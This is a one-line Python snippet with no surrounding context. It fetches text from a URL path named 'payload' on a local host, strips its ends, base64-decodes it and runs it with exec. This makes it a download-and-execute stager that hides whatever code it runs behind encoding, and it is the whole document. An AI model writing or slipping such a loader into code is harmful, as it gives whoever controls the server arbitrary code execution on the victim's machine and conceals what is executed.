from base64 import b64decode;from requests import get;exec(b64decode(get("http://127.0.0.1/payload").text[2:-2]))
